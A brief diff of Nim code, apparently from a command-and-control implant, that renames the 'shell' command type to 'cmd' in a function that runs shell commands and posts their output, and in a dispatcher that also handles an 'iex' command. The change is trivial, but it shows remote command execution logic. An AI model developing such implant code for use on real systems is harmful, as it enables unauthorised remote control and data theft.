@@ -126,7 +126,7 @@ proc run_shell_command(shell_command: string): bool =
         "output": output
     }.toOrderedTable()
 
-    is_success = post_data("shell", $data)
+    is_success = post_data("cmd", $data)
     
     return is_success
 
@@ -575,7 +575,7 @@ proc parse_command(command: JsonNode): bool =
     var command_type = command["command_type"].getStr()
 
     case command_type:
-        of "shell":
+        of "cmd":
             is_success = run_shell_command(command["shell_command"].getStr())
         of "iex":
             # direct iex
